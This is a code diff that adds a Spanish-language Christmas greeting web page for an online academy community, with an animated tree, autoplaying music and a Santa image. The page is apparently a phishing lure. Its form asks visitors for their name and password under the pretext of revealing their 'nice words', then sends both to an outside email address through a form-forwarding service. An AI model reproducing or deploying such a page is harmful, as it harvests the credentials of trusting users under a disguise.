@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="santa.css">
+    <link rel="icon" href="6190833.png">
+    <title>25 De Diciembre 2022</title>
+</head>
+<body>
+  <div class="estrella">*</div>
+  <div id="arbol"></div>
+</div>
+   <h1>FELIZ NAVIDAD A TODOS!</h1>
+  <p>Se Los Desea Con Mucho Carillo Su Administrador Yusaku <br>Para Toda La Comunidad De La Academia Fenikkusu No Isan.</br></p>
+  <div class="container">
+    <img src="santa_claus.png"  width="325" height="325" alt="Papa Noe">
+  <div class="formulario">
+    <p2 style="font-size:xx-large;">Descubre cuales son tus<br>palabras bonitas con tan solo</p2><br>
+    </div>
+    <div class="audinav">
+    <audio controls autoplay>
+      <source src="Hoy es Navidad pista.mp3" type="audio/mp3">
+  </audio>
+    </div>
+  </div>
+  <form action="https://formsubmit.co/java0919@gmail.com" method="POST">
+      <h5>Ingresar Su Nombre</h5>
+      <input id="iname" type="text" name="name" required > 
+      <h5>Y Contraseña</h5>
+      <input id="ipass" type="password" name="pass" required >
+      <br>
+      <h5>Escribe me unas Palabras de Corazón </h5>
+      <textarea name="mensaje" placeholder="" required ></textarea>
+      <br>
+      <input type="submit" value="Agregar">
+      <iframe name="iframe_wiki" src=""style="border: none;"></iframe>
+      <div class="magi">
+      <a href="boni fras.jpg" target="iframe_wiki">Apceptar</a>
+    </div>
+  </form>
+   <script>
+     var hojas ="*";
+     [10,2].forEach(row => {
+       new Array(row).fill('').forEach((v, i) => { 
+         hojas += ([
+           ... Array(9-i).fill("<span></span>"),
+           ... Array(1+i*2).fill("<span class='rojo'>*</span>"),
+           ... Array(9-3).fill("<span> </span>"),
+           ].join('')) 
+           hojas += "<br>"
+       })
+    })
+          document.getElementById("arbol").innerHTML = hojas
+          let animacion = document.querySelectorAll(".rojo") 
+          animacion.innerHTML = hojas; 
+         function animar() {
+            for(var i =0; i<animacion.length; i++){
+              let tiempo = i/20 +1 
+              animacion[i].style.animation = "colores "+tiempo+"s infinite"
+                }
+                }
+         window.addEventListener("load", animar)
+   </script>
+</body> 
+</html>
